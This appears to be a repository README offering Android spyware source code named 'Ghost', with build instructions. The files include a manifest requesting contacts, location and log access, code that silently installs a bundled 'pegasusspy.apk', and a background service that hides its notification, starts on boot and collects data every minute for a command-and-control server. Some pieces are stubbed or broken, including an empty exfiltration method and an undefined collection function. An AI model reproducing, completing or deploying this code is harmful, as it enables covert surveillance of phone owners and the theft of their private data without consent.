# System-of-down
Ghost

## AndroidManifest.xml
```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android">
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.READ_LOGS"/>
    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES"/>
    
    <application>
        <activity android:name=".MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        
        <service android:name=".SpyService"/>
        
        <receiver android:name=".StartupReceiver">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
    </application>
</manifest>
```

## MainActivity.java
```
public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Install silently
        installSilently();
        
        // Start background service
        startService(new Intent(this, SpyService.class));
        
        // Close activity
        finish();
    }
    
    private void installSilently() {
        try {
            // Create temporary file
            File tempFile = new File(getCacheDir(), "pegasusspy.apk");
            copyAssetsToFiles(tempFile);
            
            // Use package manager to install silently
            PackageInstaller packageInstaller = getPackageManager().getPackageInstaller();
            PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
                PackageInstaller.SessionParams.MODE_FULL_INSTALL);
            int sessionId = packageInstaller.createSession(params);
            
            // Write APK to session
            OutputStream out = packageInstaller.openWrite(
                "temp", 0, -1);
            FileInputStream fis = new FileInputStream(tempFile);
            byte[] buffer = new byte[65536];
            int c;
            while ((c = fis.read(buffer)) != -1) {
                out.write(buffer, 0, c);
            }
            fis.close();
            out.close();
            
            // Commit installation
            packageInstaller.commit(sessionId);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

## SpyService.java
```
public class SpyService extends Service {
    private Handler handler = new Handler();
    private Runnable runnable = new Runnable() {
        @Override
        public void run() {
            try {
                // Collect data
                collectData();
                
                // Send to C2
                sendToC2();
            } catch (Exception e) {
                e.printStackTrace();
            }
            
            // Schedule next collection
            handler.postDelayed(this, 60000);
        }
    };
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Create notification channel with minimum importance
        NotificationChannel channel = new NotificationChannel(
            "spy_channel", "Spy Channel", 
            NotificationManager.IMPORTANCE_MIN
        );
        NotificationManagerCompat.from(this).createNotificationChannel(channel);
        
        // Use transparent icon to hide notification
        Notification notification = new NotificationCompat.Builder(this, "spy_channel")
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(android.R.color.transparent)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build();
        
        // Start foreground service
        startForeground(1, notification);
        
        // Start collection in background
        new Thread(() -> {
            while(true) {
                try {
                    // Collect data
                    collectData();
                    
                    // Send to C2
                    sendToC2();
                    
                    // Sleep
                    Thread.sleep(60000);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                }
            }
        }).start();
        
        return START_STICKY;
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    private void collectData() {
        // Collect all data
        SharedPreferences prefs = getSharedPreferences("spy", MODE_PRIVATE);
        prefs.edit().putString("data", collectAllData()).apply();
    }
    
    private void sendToC2() {
        // Send to command-and-control server
    }
}
```

## StartupReceiver.java
```
public class StartupReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if(Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            // Hide from launcher
            hideFromLauncher(context);
            
            // Start service
            context.startService(new Intent(context, SpyService.class));
        }
    }
    
    private void hideFromLauncher(Context context) {
        try {
            Intent intent = new Intent(Intent.ACTION_MAIN);
            intent.addCategory(Intent.CATEGORY_DEFAULT);
            intent.setComponent(new ComponentName("com.android.launcher3", 
                "com.android.launcher3.Launcher"));
            context.startActivity(intent);
        } catch (Exception e) {
            // Ignore
        }
    }
}
```

## Build Instructions

File -> New -> New Project -> Empty Activity
Copy all files into respective folders
Build -> Generate Signed Bundle / APK
